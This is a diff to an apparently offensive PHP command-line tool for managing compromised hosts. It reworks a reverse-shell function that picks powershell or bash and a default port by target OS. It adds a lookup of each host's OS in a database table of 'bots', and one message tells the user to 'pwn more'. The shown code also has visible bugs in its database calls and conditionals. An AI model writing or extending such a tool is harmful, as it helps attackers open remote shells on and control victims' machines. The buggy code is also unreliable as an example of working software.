@@ -1,8 +1,8 @@
 <?php
 
-$config = parse_ini_file('', true);
+define("config", parse_ini_file('', true));
 define("CHH", curl_init());
-define("UAGENT", curl_setopt(CHH, CURLOPT_USERAGENT, $config['useragent']));
+define("UAGENT", curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']));
 
 function menu($clear)
 {
@@ -53,19 +53,25 @@ function sys($host)
     }
 }
 
-function rev($host, $shell, $port, $method)
+function rev($host, $shell, $port, $os)
 {
-    $usePort = "";
+    $usePort = null;
+    $Ushell = null;
     if (isset($host) and isset($port)) {
-        if ($port === "default") {
+        if ($port === "default" && $shell === "default" && $os === "win") {
             $usePort = "1634";
-        } else {
+            $Ushell = "powershell";
+        } elseif($os === "lin") {
+            $usePort = "1634";
+            $Ushell = "bash";
+        }else{
+            $Ushell = $shell;
             $usePort = $port;
         }
-        if (isset($shell) or $method){
+        if (!is_null($Ushell)){
             echo "[ !! ] Setting custom options: \n";
-            echo "Shell: ".$shell."\n";
-            echo "Method: ". $method."\n[ !! ]";
+            echo "Shell: ".$Ushell."\n";
+            echo "OS: ". $os."\n";
         }
         echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
     }
@@ -108,7 +114,18 @@ function queryDB($host){
     # work in progress.
     # @todo
     if (!empty($host)){
-        return 1;
+        try {
+            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
+            $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
+            if (!empty($row)) {
+                return $row[0];
+            }else{
+                return 0;
+            }
+        }catch (Exception $e){
+            return $e;
+        }
+
     }
     return 0;
 }
@@ -127,9 +144,12 @@ while ($run) {
         case "r":
             $h = readline("Please tell me the host.\n->");
             $p = readline("Which port shall we use?\n->");
-            echo queryDB($h);
+            if (queryDB($h) ? "win":"lin")
+                echo queryDB($h);
+            else
+                echo "Host is not in the db quite yet. Looks like you need to pwn more.";
             if (!empty($h) && !empty($p)){
-                rev($h, $p, );
+                rev($host=$h,"default", $port=$p, $os=queryDB($h));
             }
             break;
         case "c":
